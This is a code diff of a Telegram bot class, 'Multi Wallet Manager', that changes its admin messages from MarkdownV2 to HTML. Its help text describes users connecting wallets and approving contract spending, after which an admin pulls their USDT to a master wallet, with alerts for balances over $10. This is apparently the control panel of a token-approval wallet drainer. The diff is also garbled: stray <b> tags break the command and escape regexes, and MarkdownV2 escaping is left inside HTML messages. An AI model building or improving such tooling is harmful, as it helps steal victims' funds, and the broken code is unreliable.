@@ -134,7 +134,7 @@ class TelegramService {
         });
 
         // Pull command handler
-        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
+        this.bot.onText(/\/pull_(.<b>)/, (msg, match) => {
             console.log('Received /pull command from chat:', msg.chat.id);
             const walletAddress = match && match[1] ? match[1] : null;
             this.handlePullCommand(msg.chat.id, walletAddress);
@@ -200,7 +200,7 @@ class TelegramService {
         result = result.replace(/\\/g, '\\\\');
         
         // Then escape all MarkdownV2 special characters
-        result = result.replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
+        result = result.replace(/([_\</b>[]()~`>#+-=|{}.!])/g, '\\$1');
         
         return result;
     }
@@ -214,22 +214,22 @@ class TelegramService {
 
     async sendMainMenu(chatId) {
         const message = `
-🤖 *Multi Wallet Manager \\- Main Menu*
+🤖 <b>Multi Wallet Manager \- Main Menu</b>
 
-Welcome to your USDT management system\\. Select an option below:
+Welcome to your USDT management system\. Select an option below:
 
-💰 *Wallet Operations*
+💰 <b>Wallet Operations</b>
 • Pull USDT from connected wallets
 • Check wallet balances
 • Withdraw to master wallet
 
-🔐 *Security*
+🔐 <b>Security</b>
 • Only authorized admins can perform operations
 • All transactions are logged and tracked
         `;
 
         const options = {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -284,39 +284,39 @@ Welcome to your USDT management system. Select an option below:
 
     async sendHelpMenu(chatId) {
         const message = `
-🤖 *Multi Wallet Manager \\- Help*
+🤖 <b>Multi Wallet Manager \- Help</b>
 
-📚 *Available Commands:*
-• /start \\- Open main menu
-• /menu \\- Show floating menu
-• /pull\\_<address> \\- Pull USDT from specific wallet
-• /withdraw \\- Withdraw all USDT from contract
-• /balances \\- Check all balances
-• /help \\- Show this help message
+📚 <b>Available Commands:</b>
+• /start \- Open main menu
+• /menu \- Show floating menu
+• /pull\_<address> \- Pull USDT from specific wallet
+• /withdraw \- Withdraw all USDT from contract
+• /balances \- Check all balances
+• /help \- Show this help message
 
-📋 *Available Operations:*
+📋 <b>Available Operations:</b>
 • Check Smart Contract USDT Balance
 • Check Master Wallet BNB Balance
 • Check Master Wallet USDT Balance
 • Pull USDT from connected wallets
-• Auto\\-gas management for transactions
-• 6\\-hour balance monitoring
+• Auto\-gas management for transactions
+• 6\-hour balance monitoring
 
-🛡️ *Security Features:*
-• Admin\\-only operations
+🛡️ <b>Security Features:</b>
+• Admin\-only operations
 • Gas paid by master wallet
 • Wallet approval system
 • Transaction logging
 
-🔄 *Workflow:*
-1\\. Connect wallet via DApp
-2\\. Approve contract spending
-3\\. Admin pulls USDT to contract
-4\\. Admin withdraws to master wallet
+🔄 <b>Workflow:</b>
+1\. Connect wallet via DApp
+2\. Approve contract spending
+3\. Admin pulls USDT to contract
+4\. Admin withdraws to master wallet
         `;
 
         const options = {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -365,15 +365,15 @@ Welcome to your USDT management system. Select an option below:
         const escapedBalance = this.escapeMarkdown(balance);
 
         const message = `
-🔔 *NEW WALLET CONNECTED*
-Address: \`${maskedAddress}\`
-USDT Balance: *${escapedBalance} USDT*
+🔔 <b>NEW WALLET CONNECTED</b>
+Address: <code>${maskedAddress}</code>
+USDT Balance: <b>${escapedBalance} USDT</b>
 
 Actions:
         `;
 
         const options = {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -421,15 +421,15 @@ Actions:
         const escapedBalance = this.escapeMarkdown(balance);
 
         const message = `
-💰 *BALANCE ALERT*
-Address: \`${maskedAddress}\`
-USDT Balance: *${escapedBalance} USDT* \\(> \\$10\\)
+💰 <b>BALANCE ALERT</b>
+Address: <code>${maskedAddress}</code>
+USDT Balance: <b>${escapedBalance} USDT</b> \(> \\$10\)
 
 Actions:
         `;
 
         const options = {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -476,16 +476,16 @@ Actions:
         const maskedTxHash = this.maskAddress(txHash);
 
         const message = `
-✅ *SUCCESSFUL PULL*
-Address: \`${maskedAddress}\`
-Amount: *${escapedAmount} USDT*
-Transaction: \`${maskedTxHash}\`
+✅ <b>SUCCESSFUL PULL</b>
+Address: <code>${maskedAddress}</code>
+Amount: <b>${escapedAmount} USDT</b>
+Transaction: <code>${maskedTxHash}</code>
 
 Next steps:
         `;
 
         const options = {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -535,23 +535,23 @@ Next steps:
             const query = 'SELECT address, name, usdt_balance FROM wallets WHERE is_approved = true AND is_processed = false ORDER BY created_at DESC LIMIT 10';
             const result = await database.query(query);
 
-            let message = '📤 *Select Wallet to Pull*\\n\\n';
+            let message = '📤 <b>Select Wallet to Pull</b>\\n\\n';
 
             if (!result || !result.rows || result.rows.length === 0) {
-                message += 'No approved wallets available for pulling\\.\\n\\n';
-                message += 'Use: /pull\\_<wallet\\_address>';
+                message += 'No approved wallets available for pulling\.\\n\\n';
+                message += 'Use: /pull\_<wallet\_address>';
             } else {
                 message += 'Click on a wallet to pull USDT:\\n\\n';
                 for (let i = 0; i < result.rows.length; i++) {
                     const wallet = result.rows[i];
                     const maskedAddress = this.maskAddress(wallet.address);
                     const escapedBalance = this.escapeMarkdown(wallet.usdt_balance || '0');
-                    message += `${i + 1}\\. \`${maskedAddress}\` \\(${escapedBalance} USDT\\)\\n`;
+                    message += `${i + 1}\. <code>${maskedAddress}</code> \(${escapedBalance} USDT\)\\n`;
                 }
             }
 
             const options = {
-                parse_mode: 'MarkdownV2',
+                parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
                         ...(result && result.rows ? result.rows.map((wallet, index) => ([[
@@ -673,20 +673,20 @@ Failed to fetch wallet list. Please try again later.
         const maskedAddress = this.maskAddress(walletAddress);
 
         const message = `
-🔄 *Pull Operation Initiated*
-Wallet: \`${maskedAddress}\`
+🔄 <b>Pull Operation Initiated</b>
+Wallet: <code>${maskedAddress}</code>
 
-Processing\\.\\.\\. This will:
-1\\. Check wallet gas balance
-2\\. Send gas if needed
-3\\. Pull USDT to contract
-4\\. Send confirmation
+Processing\.\.\. This will:
+1\. Check wallet gas balance
+2\. Send gas if needed
+3\. Pull USDT to contract
+4\. Send confirmation
 
-⏳ *Please wait*\\.\\.\\.
+⏳ <b>Please wait</b>\.\.\.
         `;
 
         const options = {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -728,14 +728,14 @@ Processing\\.\\.\\. This will:
                         const gasResult = await gasService.sendGasToWallet(walletAddress);
                         if (!gasResult || !gasResult.success) {
                             const errorMessage = `
-❌ *GAS FAILED*
-Wallet: \`${maskedAddress}\`
+❌ <b>GAS FAILED</b>
+Wallet: <code>${maskedAddress}</code>
 Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 'Unknown error')}
 
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                             `;
                             await this.bot.sendMessage(chatId, errorMessage, {
-                                parse_mode: 'MarkdownV2',
+                                parse_mode: 'HTML',
                                 reply_markup: {
                                     inline_keyboard: [
                                         [
@@ -761,19 +761,19 @@ Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 
                 const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
                 const successMessage = `
-✅ *PULL SUCCESSFUL*
-Wallet: \`${maskedAddress}\`
-Amount: *${escapedAmount} USDT*
-Transaction: \`${escapedTxHash}\`
+✅ <b>PULL SUCCESSFUL</b>
+Wallet: <code>${maskedAddress}</code>
+Amount: <b>${escapedAmount} USDT</b>
+Transaction: <code>${escapedTxHash}</code>
 
-📊 *Updated Balances:*
+📊 <b>Updated Balances:</b>
 • Check balances for update
 
-🔄 *Last Updated:* ${escapedTimestamp}
+🔄 <b>Last Updated:</b> ${escapedTimestamp}
                 `;
 
                 await this.bot.sendMessage(chatId, successMessage, {
-                    parse_mode: 'MarkdownV2',
+                    parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
@@ -800,14 +800,14 @@ Transaction: \`${escapedTxHash}\`
                 }
             } else {
                 const errorMessage = `
-❌ *PULL FAILED*
-Wallet: \`${maskedAddress}\`
+❌ <b>PULL FAILED</b>
+Wallet: <code>${maskedAddress}</code>
 Error: ${this.escapeMarkdown((pullResult && pullResult.error) ? pullResult.error : 'Unknown error')}
 
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                 `;
                 await this.bot.sendMessage(chatId, errorMessage, {
-                    parse_mode: 'MarkdownV2',
+                    parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
@@ -824,16 +824,16 @@ Error: ${this.escapeMarkdown((pullResult && pullResult.error) ? pullResult.error
             console.error('Error in pull command:', error && error.message ? error.message : error);
 
             const errorMessage = `
-❌ *PULL FAILED*
-Wallet: \`${this.maskAddress(walletAddress)}\`
+❌ <b>PULL FAILED</b>
+Wallet: <code>${this.maskAddress(walletAddress)}</code>
 Error: ${this.escapeMarkdown(error && error.message ? error.message : String(error))}
 
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
             `;
 
             try {
                 await this.bot.sendMessage(chatId, errorMessage, {
-                    parse_mode: 'MarkdownV2',
+                    parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
@@ -857,19 +857,19 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : String(err
         }
 
         const processingMessage = `
-🏦 *Withdraw Operation Initiated*
-Withdrawing all USDT from contract to master wallet\\.\\.\\.
+🏦 <b>Withdraw Operation Initiated</b>
+Withdrawing all USDT from contract to master wallet\.\.\.
 
-📋 *Operations to perform:*
+📋 <b>Operations to perform:</b>
 • Check contract USDT balance
 • Execute withdrawal transaction
 • Send confirmation
 
-⏳ *Please wait*\\.\\.\\.
+⏳ <b>Please wait</b>\.\.\.
         `;
 
         const processingOptions = {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -911,20 +911,20 @@ Withdrawing all USDT from contract to master wallet\\.\\.\\.
                 const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
                 const successMessage = `
-✅ *WITHDRAWAL SUCCESSFUL*
-Amount: *${escapedAmount} USDT*
-To: \`${escapedMasterWallet}\`
-Transaction: \`${escapedTxHash}\`
+✅ <b>WITHDRAWAL SUCCESSFUL</b>
+Amount: <b>${escapedAmount} USDT</b>
+To: <code>${escapedMasterWallet}</code>
+Transaction: <code>${escapedTxHash}</code>
 
-📊 *Updated Balances:*
-• Contract USDT: 0\\.00 USDT
+📊 <b>Updated Balances:</b>
+• Contract USDT: 0\.00 USDT
 • Master Wallet USDT: Check balances for update
 
-🔄 *Last Updated:* ${escapedTimestamp}
+🔄 <b>Last Updated:</b> ${escapedTimestamp}
                 `;
 
                 await this.bot.sendMessage(chatId, successMessage, {
-                    parse_mode: 'MarkdownV2',
+                    parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
@@ -940,14 +940,14 @@ Transaction: \`${escapedTxHash}\`
                 const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
                 const errorMessage = `
-❌ *WITHDRAWAL FAILED*
+❌ <b>WITHDRAWAL FAILED</b>
 Error: ${escapedError}
 
-🔄 *Last Updated:* ${escapedTimestamp}
+🔄 <b>Last Updated:</b> ${escapedTimestamp}
                 `;
                 
                 await this.bot.sendMessage(chatId, errorMessage, {
-                    parse_mode: 'MarkdownV2',
+                    parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
@@ -965,21 +965,21 @@ Error: ${escapedError}
 
             // Escape error message
             const cleanErrorMessage = error && error.message
-                ? error.message.replace(/[^a-zA-Z0-9\s\.\,\!\?\-]/g, '').substring(0, 200)
+                ? error.message.replace(/[^a-zA-Z0-9\s.\,!\?-]/g, '').substring(0, 200)
                 : 'Unknown error occurred';
             const escapedErrorMessage = this.escapeMarkdown(cleanErrorMessage);
             const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
             const errorMessage = `
-❌ *WITHDRAWAL FAILED*
+❌ <b>WITHDRAWAL FAILED</b>
 Error: ${escapedErrorMessage}
 
-🔄 *Last Updated:* ${escapedTimestamp}
+🔄 <b>Last Updated:</b> ${escapedTimestamp}
             `;
 
             try {
                 await this.bot.sendMessage(chatId, errorMessage, {
-                    parse_mode: 'MarkdownV2',
+                    parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
@@ -1003,18 +1003,18 @@ Error: ${escapedErrorMessage}
         }
 
         const processingMessage = `
-📊 *Fetching Real Balances*
+📊 <b>Fetching Real Balances</b>
 
-📋 *Balance Checks:*
+📋 <b>Balance Checks:</b>
 • Smart Contract USDT Balance
 • Master Wallet BNB Balance
 • Master Wallet USDT Balance
 
-⏳ *Querying blockchain*\\.\\.\\.
+⏳ <b>Querying blockchain</b>\.\.\.
         `;
 
         const processingOptions = {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -1061,34 +1061,34 @@ Error: ${escapedErrorMessage}
             const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
             let balancesMessage = `
-📊 *REAL BALANCE REPORT*
+📊 <b>REAL BALANCE REPORT</b>
 
 `;
 
             // Contract USDT Balance
             if (process.env.CONTRACT_ADDRESS) {
                 balancesMessage += `
-💰 *Smart Contract*
-• Address: \`${escapedContractAddress}\`
-• USDT Balance: *${escapedContractBalance} USDT*
+💰 <b>Smart Contract</b>
+• Address: <code>${escapedContractAddress}</code>
+• USDT Balance: <b>${escapedContractBalance} USDT</b>
 `;
                 if (escapedContractError) {
                     balancesMessage += `• ⚠️ Error: ${escapedContractError}\n`;
                 }
             } else {
                 balancesMessage += `
-💰 *Smart Contract*
+💰 <b>Smart Contract</b>
 • Address: Not configured
-• USDT Balance: 0\\.00 USDT
+• USDT Balance: 0\.00 USDT
 `;
             }
 
             // Master Wallet Balances
             balancesMessage += `
-🏦 *Master Wallet*
-• Address: \`${escapedMasterWallet}\`
-• BNB Balance: *${escapedBNBBalance} BNB*
-• USDT Balance: *${escapedUSDTBalance} USDT*
+🏦 <b>Master Wallet</b>
+• Address: <code>${escapedMasterWallet}</code>
+• BNB Balance: <b>${escapedBNBBalance} BNB</b>
+• USDT Balance: <b>${escapedUSDTBalance} USDT</b>
 `;
 
             if (escapedBNBError) {
@@ -1099,11 +1099,11 @@ Error: ${escapedErrorMessage}
             }
 
             balancesMessage += `
-🔄 *Last Updated:* ${escapedTimestamp}
+🔄 <b>Last Updated:</b> ${escapedTimestamp}
 `;
 
             await this.bot.sendMessage(chatId, balancesMessage, {
-                parse_mode: 'MarkdownV2',
+                parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
                         [
@@ -1124,20 +1124,20 @@ Error: ${escapedErrorMessage}
 
             // Create a clean error message without special characters
             const cleanErrorMessage = error && error.message
-                ? error.message.replace(/[^a-zA-Z0-9\s\.\,\!\?\-]/g, '').substring(0, 200)
+                ? error.message.replace(/[^a-zA-Z0-9\s.\,!\?-]/g, '').substring(0, 200)
                 : 'Unknown error occurred';
 
             const errorMessage = `
-❌ *BALANCES FAILED*
+❌ <b>BALANCES FAILED</b>
 Error: ${this.escapeMarkdown(cleanErrorMessage)}
 
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
     `;
 
             // Send with fallback to plain text if markdown fails
             try {
                 await this.bot.sendMessage(chatId, errorMessage, {
-                    parse_mode: 'MarkdownV2',
+                    parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
